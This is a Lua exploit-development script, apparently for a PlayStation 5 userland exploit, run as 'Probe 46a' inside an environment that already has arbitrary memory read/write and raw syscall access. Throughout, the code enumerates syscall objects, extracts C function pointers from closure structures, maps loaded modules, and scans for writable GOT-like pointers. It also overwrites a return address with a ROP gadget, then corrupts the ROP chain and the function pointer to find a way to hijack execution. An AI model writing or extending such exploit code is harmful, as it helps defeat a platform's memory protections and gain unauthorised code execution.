-- CRASH_CLASS: MODERATE (chain corruption test at end may crash process)
-- PROBE 46a: LOADER DISPATCH ANALYSIS
--
-- Context: Probe 45c proved make_syscall() copies bypass the ROP chain entirely.
-- But make_syscall() creates a PLAIN TABLE, while syscall.pipe is USERDATA.
-- The __call metamethod might dispatch differently for userdata vs table.
-- If the original userdata uses the chain, we can hijack it for code exec.
--
-- Tests (non-destructive first, destructive last):
-- A: Enumerate syscall.* namespace — find all available syscall objects
-- B: Metatable analysis — enumerate metamethods, get __call C function address
-- C: __call C function extraction — read CClosure struct to find real C function pointer
-- D: Pipe object deep dump — map the userdata structure at pipe address
-- E: Module cross-reference — which module owns __call?
-- F: Syscall object type comparison — userdata vs make_syscall table
-- G: Return address manipulation — does changing return_addr redirect flow?
-- H: GOT/PLT scan — look for writable function pointers near __call
-- I: DISPATCH PATH TEST (DESTRUCTIVE) — corrupt chain, test userdata vs table call

print("=== PROBE 46a: LOADER DISPATCH ANALYSIS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("%08X_%08X", h, l)
end

local pid = to_num(make_syscall(20)())
print("pid: " .. pid)
print("")

-- Parse pipe string for key addresses
local pipe_str = tostring(syscall.pipe)
local pipe_addr_str = pipe_str:match("address @ (0x[0-9a-fA-F]+)")
local rop_addr_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local ret_addr_str = pipe_str:match("fcall_stub%.return_addr: (0x[0-9a-fA-F]+)")

print("=== A: SYSCALL NAMESPACE ENUMERATION ===")
print("  type(syscall) = " .. type(syscall))
local syscall_keys = {}
local ok_enum, err_enum = pcall(function()
    for k, v in pairs(syscall) do
        table.insert(syscall_keys, k)
        local vtype = type(v)
        local vstr = ""
        if vtype == "function" then
            vstr = tostring(v)
        elseif vtype == "userdata" then
            local us = tostring(v)
            local short = us:match("address @ (0x[0-9a-fA-F]+)")
            vstr = "userdata @ " .. (short or "?")
        elseif vtype == "table" then
            vstr = "table"
        else
            vstr = tostring(v)
        end
        print("  syscall." .. tostring(k) .. " [" .. vtype .. "] = " .. vstr)
    end
end)
if not ok_enum then print("  enumeration error: " .. tostring(err_enum)) end
print("  total keys: " .. #syscall_keys)

-- Also check syscall metatable
print("  type(syscall) metatable:")
local ok_smt, smt = pcall(function() return getmetatable(syscall) end)
if ok_smt and smt then
    for k, v in pairs(smt) do
        print("    " .. tostring(k) .. " = " .. tostring(v))
    end
else
    print("    none or inaccessible")
end

-- Check resolve function
print("  syscall.resolve type: " .. type(syscall.resolve))
if type(syscall.resolve) == "function" then
    print("  syscall.resolve addr: " .. tostring(syscall.resolve))
end
print("")

print("=== B: METATABLE ANALYSIS ===")
local mt = getmetatable(syscall.pipe)
if mt == nil then
    print("  *** NO METATABLE on syscall.pipe! ***")
else
    print("  metatable type: " .. type(mt))
    print("  metatable addr: " .. tostring(mt))
    local mt_keys = {}
    for k, v in pairs(mt) do
        table.insert(mt_keys, tostring(k))
        print("  " .. tostring(k) .. " [" .. type(v) .. "] = " .. tostring(v))
    end
    print("  total metamethods: " .. #mt_keys)

    -- Also check if metatable has its own metatable
    local ok_mmt, mmt = pcall(function() return getmetatable(mt) end)
    if ok_mmt and mmt then
        print("  metatable's metatable: " .. tostring(mmt))
    else
        print("  metatable's metatable: none")
    end
end
print("")

print("=== C: __CALL C FUNCTION EXTRACTION ===")
if mt and mt.__call then
    local call_fn = mt.__call
    local call_str = tostring(call_fn)
    print("  __call tostring: " .. call_str)
    print("  __call type: " .. type(call_fn))

    -- Extract address from "function: 0xADDRESS"
    local fn_hex = call_str:match("0x([0-9a-fA-F]+)")
    if fn_hex then
        local fn_obj_addr = uint64("0x" .. fn_hex)
        print("  __call object address: 0x" .. fn_hex)

        -- Read CClosure struct to find actual C function pointer
        -- Lua 5.1 CClosure layout (64-bit):
        --   +0:  GCObject *next (8)
        --   +8:  lu_byte tt (1) + lu_byte marked (1) + lu_byte isC (1) + lu_byte nupvalues (1)
        --   +12: padding (4)
        --   +16: GCObject *gclist (8)
        --   +24: Table *env (8)
        --   +32: lua_CFunction f (8)  ← THIS IS THE REAL C FUNCTION POINTER
        -- But PS5 build may have different alignment. Try multiple offsets.

        print("  Reading CClosure struct:")
        for off = 0, 64, 8 do
            local val = safe_rq(fn_obj_addr + off)
            if val then
                print(string.format("    +%02d: %s", off, fmt_addr(val)))
            else
                print(string.format("    +%02d: UNREADABLE", off))
            end
        end

        -- The C function pointer is likely at offset 32 (standard) or nearby
        -- Try to identify it by checking which module it falls in
        print("")
        print("  Candidate C function pointers:")
        for _, off in ipairs({24, 32, 40, 48}) do
            local val = safe_rq(fn_obj_addr + off)
            if val then
                local h, l = get_hi_lo(val)
                print(string.format("    +%02d: %s (hi=%08X)", off, fmt_addr(val), h))
            end
        end
    else
        print("  could not parse address from: " .. call_str)
    end
else
    print("  *** __call not found in metatable ***")
end
print("")

print("=== D: PIPE OBJECT DEEP DUMP ===")
print("  pipe tostring: " .. (pipe_addr_str or "nil"))
print("  pipe type: " .. type(syscall.pipe))

-- Try to get the raw userdata pointer
-- In Lua 5.1, userdata is a GCObject with a data block
-- The address from tostring might be the userdata value or the Udata struct

if pipe_addr_str then
    local pipe_addr = uint64(pipe_addr_str)
    print("  Reading pipe object memory:")

    -- Dump 256 bytes of the pipe object
    for off = -32, 224, 8 do
        local val = safe_rq(pipe_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            local note = ""
            -- Annotate known addresses
            if rop_addr_str and fmt_addr(val) == fmt_addr(uint64(rop_addr_str)) then
                note = " ← ropchain"
            end
            if fn_addr_str and fmt_addr(val) == fmt_addr(uint64(fn_addr_str)) then
                note = " ← fn_addr_ptr"
            end
            if ret_addr_str and fmt_addr(val) == fmt_addr(uint64(ret_addr_str)) then
                note = " ← return_addr_ptr"
            end
            print(string.format("    %+04d: %s%s", off, fmt_addr(val), note))
        else
            print(string.format("    %+04d: UNREADABLE", off))
        end
    end
else
    print("  *** could not parse pipe address ***")
end

-- Also enumerate pipe's own fields via pairs()
print("")
print("  Pipe object fields (via pairs):")
local pipe_fields = {}
local ok_pf = pcall(function()
    for k, v in pairs(syscall.pipe) do
        table.insert(pipe_fields, k)
        local vtype = type(v)
        local vstr
        if vtype == "number" then
            vstr = string.format("0x%X (%d)", v, v)
        elseif vtype == "userdata" or vtype == "table" then
            vstr = tostring(v)
        else
            vstr = tostring(v)
        end
        print("    " .. tostring(k) .. " [" .. vtype .. "] = " .. vstr)
    end
end)
if not ok_pf then print("    pairs() failed: " .. tostring(select(2, ok_pf))) end
print("  total fields: " .. #pipe_fields)
print("")

print("=== E: MODULE CROSS-REFERENCE ===")
-- Get module info to cross-reference addresses
local sc_info = make_syscall(593)  -- dynlib_get_info
local info_buf = memory.alloc(0x200)

-- Get the module handles first
-- Handle 0 = eboot, handles 1+ = libraries
local modules = {}
for handle = 0, 40 do
    safe_wd(info_buf, 0x160)
    local ok_mi = pcall(function() sc_info(uint64(handle), uint64(info_buf)) end)
    if ok_mi then
        local text_lo = safe_rd(info_buf + 0x108)
        local text_hi = safe_rd(info_buf + 0x10C)
        local text_sz_lo = safe_rd(info_buf + 0x110)
        local text_sz_hi = safe_rd(info_buf + 0x114)
        if text_lo and text_hi and (text_lo ~= 0 or text_hi ~= 0) then
            local text_base = uint64(string.format("0x%X%08X", text_hi, text_lo))
            local text_size = uint64(string.format("0x%X%08X", text_sz_hi or 0, text_sz_lo or 0))
            local data_lo = safe_rd(info_buf + 0x118)
            local data_hi = safe_rd(info_buf + 0x11C)
            local data_sz_lo = safe_rd(info_buf + 0x120)
            local data_sz_hi = safe_rd(info_buf + 0x124)
            local data_base = nil
            local data_size = nil
            if data_lo and data_hi then
                data_base = uint64(string.format("0x%X%08X", data_hi, data_lo))
                data_size = uint64(string.format("0x%X%08X", data_sz_hi or 0, data_sz_lo or 0))
            end
            table.insert(modules, {
                handle = handle,
                text_base = text_base,
                text_size = text_size,
                text_hi = text_hi, text_lo = text_lo,
                text_sz_hi = text_sz_hi or 0, text_sz_lo = text_sz_lo or 0,
                data_base = data_base,
                data_size = data_size,
                data_hi = data_hi, data_lo = data_lo,
                data_sz_hi = data_sz_hi or 0, data_sz_lo = data_sz_lo or 0,
            })
        end
    end
end
print("  loaded modules: " .. #modules)
for _, m in ipairs(modules) do
    print(string.format("  [%2d] text: %s size: %08X_%08X",
        m.handle, fmt_addr(m.text_base), m.text_sz_hi, m.text_sz_lo))
    if m.data_base then
        print(string.format("       data: %s size: %08X_%08X",
            fmt_addr(m.data_base), m.data_sz_hi, m.data_sz_lo))
    end
end

-- Cross-reference key addresses with modules
local function find_module(addr_val)
    if addr_val == nil then return nil end
    local ah, al = get_hi_lo(addr_val)
    for _, m in ipairs(modules) do
        -- Check text section
        local tb_h, tb_l = m.text_hi, m.text_lo
        local te_h = m.text_hi + m.text_sz_hi
        local te_l = m.text_lo + m.text_sz_lo
        if te_l >= 0x100000000 then te_h = te_h + 1; te_l = te_l - 0x100000000 end
        if (ah > tb_h or (ah == tb_h and al >= tb_l)) and
           (ah < te_h or (ah == te_h and al < te_l)) then
            return m.handle, "text", al - tb_l
        end
        -- Check data section
        if m.data_base then
            local db_h, db_l = m.data_hi, m.data_lo
            local de_h = db_h + m.data_sz_hi
            local de_l = db_l + m.data_sz_lo
            if de_l >= 0x100000000 then de_h = de_h + 1; de_l = de_l - 0x100000000 end
            if (ah > db_h or (ah == db_h and al >= db_l)) and
               (ah < de_h or (ah == de_h and al < de_l)) then
                return m.handle, "data", al - db_l
            end
        end
    end
    return nil
end

print("")
print("  Address cross-reference:")
-- Check __call candidates
if mt and mt.__call then
    local cs = tostring(mt.__call)
    local ch = cs:match("0x([0-9a-fA-F]+)")
    if ch then
        local caddr = uint64("0x" .. ch)
        local mod, sect, off = find_module(caddr)
        if mod then
            print(string.format("  __call obj (0x%s) → module %d %s +0x%X", ch, mod, sect, off))
        else
            print(string.format("  __call obj (0x%s) → NOT in any module", ch))
        end
        -- Check the C function pointer candidates
        for _, foff in ipairs({24, 32, 40, 48}) do
            local val = safe_rq(caddr + foff)
            if val then
                local fmod, fsect, foff2 = find_module(val)
                if fmod then
                    print(string.format("  __call+%d (%s) → module %d %s +0x%X",
                        foff, fmt_addr(val), fmod, fsect, foff2))
                end
            end
        end
    end
end

-- Check pipe address
if pipe_addr_str then
    local pmod, psect, poff = find_module(uint64(pipe_addr_str))
    if pmod then
        print(string.format("  pipe obj (%s) → module %d %s +0x%X", pipe_addr_str, pmod, psect, poff))
    else
        print(string.format("  pipe obj (%s) → NOT in any module (heap?)", pipe_addr_str))
    end
end
print("")

print("=== F: SYSCALL OBJECT TYPE COMPARISON ===")
-- Compare the original pipe (userdata) with a make_syscall copy (table)
local ms_getpid = make_syscall(20)

print("  Original syscall.pipe:")
print("    type: " .. type(syscall.pipe))
print("    tostring: " .. tostring(syscall.pipe):sub(1, 80))
print("    metatable: " .. tostring(getmetatable(syscall.pipe)))

print("  make_syscall(20) copy:")
print("    type: " .. type(ms_getpid))
print("    tostring: " .. tostring(ms_getpid):sub(1, 80))
print("    metatable: " .. tostring(getmetatable(ms_getpid)))

-- Check if metatables are identical
print("  same metatable? " .. tostring(getmetatable(syscall.pipe) == getmetatable(ms_getpid)))

-- Enumerate the copy's fields
print("  Copy fields:")
for k, v in pairs(ms_getpid) do
    print("    " .. tostring(k) .. " [" .. type(v) .. "] = " .. tostring(v):sub(1, 60))
end

-- Check which fields the copy has vs the original
print("  Original fields accessed via copy:")
print("    copy.syscall_no = " .. tostring(ms_getpid.syscall_no))
local ok_fn, fn_v = pcall(function() return ms_getpid.fn_addr end)
print("    copy.fn_addr = " .. tostring(fn_v))
local ok_rc, rc_v = pcall(function() return ms_getpid.ropchain end)
print("    copy.ropchain = " .. tostring(rc_v))

-- Test __call with both types
print("")
print("  Calling both (no corruption):")
local ok1, ret1 = pcall(function() return ms_getpid() end)
print("    make_syscall(20)(): ok=" .. tostring(ok1) .. " ret=" .. tostring(to_num(ret1)))

-- Call syscall.pipe directly (pipe syscall = 42, needs fd buffer but won't crash)
local ok2, ret2 = pcall(function() return syscall.pipe() end)
print("    syscall.pipe(): ok=" .. tostring(ok2) .. " ret=" .. tostring(ret2))
print("")

print("=== G: RETURN ADDRESS MANIPULATION ===")
-- fcall_stub layout from 45c:
-- +0x00: fn_addr (8 bytes)
-- +0x08: stack_pivot_gadget (8 bytes) — 0x08CF49A2 = pop rax; ret + 0x10 offset
-- +0x10: return_addr (8 bytes) — where execution returns after syscall
-- +0x18: flags (8 bytes)

if fn_addr_str then
    local fn_ptr = uint64(fn_addr_str)
    print("  fcall_stub base: " .. fn_addr_str)

    -- Read current values
    local orig_fn = safe_rq(fn_ptr)
    local orig_pivot = safe_rq(fn_ptr + 8)
    local orig_ret = safe_rq(fn_ptr + 16)
    local orig_flags = safe_rq(fn_ptr + 24)

    print("  +00 fn_addr:    " .. fmt_addr(orig_fn))
    print("  +08 pivot:      " .. fmt_addr(orig_pivot))
    print("  +16 return_addr:" .. fmt_addr(orig_ret))
    print("  +24 flags:      " .. fmt_addr(orig_flags))

    -- Check if return_addr is writable
    local test_val = safe_rq(fn_ptr + 16)
    if test_val then
        -- Save original
        local saved_ret = test_val

        -- Write a known value to return_addr
        local wrote_ok = safe_wq(fn_ptr + 16, uint64("0xDEADBEEFCAFE0000"))
        local readback = safe_rq(fn_ptr + 16)
        print("  return_addr writable: " .. tostring(wrote_ok))
        print("  readback: " .. fmt_addr(readback))

        -- Restore immediately
        safe_wq(fn_ptr + 16, saved_ret)
        print("  restored return_addr: " .. fmt_addr(safe_rq(fn_ptr + 16)))

        -- Now test: does changing return_addr affect make_syscall behavior?
        -- Save, modify, call getpid, check result, restore
        local saved = safe_rq(fn_ptr + 16)

        -- Try pointing return_addr to a ret gadget (should be a no-op if used)
        -- Use the known ret gadget from ropchain: 0x08CF4042
        local ret_gadget = uint64("0x08CF4042")
        safe_wq(fn_ptr + 16, ret_gadget)

        local ok_r, ret_r = pcall(function() return make_syscall(20)() end)
        print("  getpid with return_addr=ret_gadget: ok=" .. tostring(ok_r) ..
              " ret=" .. tostring(to_num(ret_r)))

        -- Restore
        safe_wq(fn_ptr + 16, saved)
        local ok_r2, ret_r2 = pcall(function() return make_syscall(20)() end)
        print("  getpid after restore: ok=" .. tostring(ok_r2) ..
              " ret=" .. tostring(to_num(ret_r2)))
    end
else
    print("  *** fn_addr_str not parsed ***")
end
print("")

print("=== H: GOT/PLT SCAN ===")
-- If we identified which module __call is in, scan its data section
-- for function pointer patterns (sequential pointers into .text = GOT)
if #modules > 0 then
    -- Eboot is module 0 — scan its data section for GOT-like entries
    local eboot = modules[1]
    if eboot.data_base then
        print("  Eboot data section: " .. fmt_addr(eboot.data_base) ..
              " size: " .. string.format("%08X_%08X", eboot.data_sz_hi, eboot.data_sz_lo))

        -- Scan first 4KB of data section for pointers into text
        local got_entries = {}
        local scan_limit = math.min(4096, to_num(eboot.data_size) or 4096)
        local tb_h, tb_l = eboot.text_hi, eboot.text_lo

        for off = 0, scan_limit - 8, 8 do
            local val = safe_rq(eboot.data_base + off)
            if val then
                local vh, vl = get_hi_lo(val)
                -- Check if it points into eboot text
                if vh == tb_h and vl >= tb_l and
                   vl < tb_l + (eboot.text_sz_lo or 0) then
                    table.insert(got_entries, {offset = off, value = val})
                    if #got_entries <= 20 then
                        print(string.format("    data+0x%04X: %s (text+0x%X)",
                            off, fmt_addr(val), vl - tb_l))
                    end
                end
            end
        end
        print("  GOT-like entries in first 4KB: " .. #got_entries)

        if #got_entries > 20 then
            print("  (showing first 20)")
        end

        -- Now check: are any of these writable?
        if #got_entries > 0 then
            local first = got_entries[1]
            local saved = safe_rq(eboot.data_base + first.offset)
            local wrote = safe_wq(eboot.data_base + first.offset, uint64("0x4141414141414141"))
            local rb = safe_rq(eboot.data_base + first.offset)
            local is_writable = (fmt_addr(rb) == "00000000_41414141" or
                                 fmt_addr(rb) == "41414141_41414141")
            safe_wq(eboot.data_base + first.offset, saved)
            print("  data section writable: " .. tostring(is_writable or wrote))
        end
    else
        print("  eboot data section not found in dynlib_get_info")
    end

    -- Also check libkernel (usually module 1) data section
    if #modules >= 2 then
        local lk = modules[2]
        if lk.data_base then
            print("")
            print("  Module 1 data section: " .. fmt_addr(lk.data_base) ..
                  " size: " .. string.format("%08X_%08X", lk.data_sz_hi, lk.data_sz_lo))

            local lk_got = {}
            local lk_limit = math.min(4096, to_num(lk.data_size) or 4096)
            for off = 0, lk_limit - 8, 8 do
                local val = safe_rq(lk.data_base + off)
                if val then
                    local vh, vl = get_hi_lo(val)
                    if vh == lk.text_hi and vl >= lk.text_lo and
                       vl < lk.text_lo + (lk.text_sz_lo or 0) then
                        table.insert(lk_got, {offset = off, value = val})
                        if #lk_got <= 10 then
                            print(string.format("    data+0x%04X: %s", off, fmt_addr(val)))
                        end
                    end
                end
            end
            print("  Module 1 GOT-like entries in first 4KB: " .. #lk_got)
        end
    end
else
    print("  no modules loaded")
end
print("")

print("=== I: DISPATCH PATH TEST (DESTRUCTIVE) ===")
print("*** This test corrupts the ROP chain to determine if ***")
print("*** the original userdata uses it vs make_syscall copies ***")
print("")

if rop_addr_str then
    local rop_base = uint64(rop_addr_str)

    -- Baseline: both should work with intact chain
    local ok_baseline_ms, ret_baseline_ms = pcall(function() return make_syscall(20)() end)
    local ok_baseline_pipe, ret_baseline_pipe = pcall(function() return syscall.pipe() end)
    print("  Baseline (intact chain):")
    print("    make_syscall(20): ok=" .. tostring(ok_baseline_ms) ..
          " ret=" .. tostring(to_num(ret_baseline_ms)))
    print("    syscall.pipe():   ok=" .. tostring(ok_baseline_pipe) ..
          " ret=" .. tostring(ret_baseline_pipe))

    -- Save first 64 bytes of chain
    local saved_chain = {}
    for i = 0, 56, 8 do
        saved_chain[i] = safe_rq(rop_base + i)
    end
    print("  saved chain[0..56]")

    -- CORRUPT the chain
    for i = 0, 56, 8 do
        safe_wq(rop_base + i, uint64("0x4141414141414141"))
    end
    print("  corrupted chain[0..56] with 0x41414141_41414141")

    -- Test 1: make_syscall copy (should still work — confirmed by 45c)
    local ok_ms, ret_ms = pcall(function() return make_syscall(20)() end)
    print("")
    print("  With corrupted chain:")
    print("    make_syscall(20): ok=" .. tostring(ok_ms) .. " ret=" .. tostring(to_num(ret_ms)))

    -- Test 2: original syscall.pipe (THE KEY TEST)
    -- If this crashes, the original userdata USES the chain!
    print("    calling syscall.pipe() with corrupted chain...")
    local ok_pipe, ret_pipe = pcall(function() return syscall.pipe() end)
    print("    syscall.pipe():   ok=" .. tostring(ok_pipe) .. " ret=" .. tostring(ret_pipe))

    if ok_pipe then
        print("  *** BOTH SURVIVED — neither path uses the ROP chain ***")
        print("  *** The C wrapper handles all dispatch ***")
    else
        print("  *** syscall.pipe() FAILED/CRASHED with corrupted chain! ***")
        print("  *** The original userdata DOES use the ROP chain! ***")
        print("  *** This means we CAN hijack execution via chain manipulation! ***")
    end

    -- Restore chain
    for i = 0, 56, 8 do
        if saved_chain[i] then
            safe_wq(rop_base + i, saved_chain[i])
        end
    end
    print("  chain restored")

    -- Verify restoration
    local ok_verify, ret_verify = pcall(function() return make_syscall(20)() end)
    print("  verify after restore: ok=" .. tostring(ok_verify) ..
          " ret=" .. tostring(to_num(ret_verify)))

    -- Also test: corrupt fn_addr itself and call syscall.pipe
    if fn_addr_str then
        print("")
        print("  fn_addr corruption test:")
        local fn_ptr = uint64(fn_addr_str)
        local saved_fn = safe_rq(fn_ptr)
        print("    saved fn_addr: " .. fmt_addr(saved_fn))

        -- Write a NOP (0x0) to fn_addr
        safe_wq(fn_ptr, uint64("0x0"))
        print("    fn_addr set to NULL")

        local ok_fn_ms, ret_fn_ms = pcall(function() return make_syscall(20)() end)
        print("    make_syscall(20): ok=" .. tostring(ok_fn_ms) ..
              " ret=" .. tostring(to_num(ret_fn_ms)))

        local ok_fn_pipe, ret_fn_pipe = pcall(function() return syscall.pipe() end)
        print("    syscall.pipe():   ok=" .. tostring(ok_fn_pipe) ..
              " ret=" .. tostring(ret_fn_pipe))

        -- Restore fn_addr
        safe_wq(fn_ptr, saved_fn)
        print("    fn_addr restored: " .. fmt_addr(safe_rq(fn_ptr)))

        if ok_fn_pipe and ok_fn_ms then
            print("  *** BOTH survived NULL fn_addr ***")
        elseif not ok_fn_pipe and ok_fn_ms then
            print("  *** syscall.pipe CRASHED with NULL fn_addr! ***")
            print("  *** fn_addr IS used by original userdata path! ***")
        end
    end
else
    print("  *** could not parse ropchain address ***")
end
print("")

print("=== PROBE 46a COMPLETE ===")
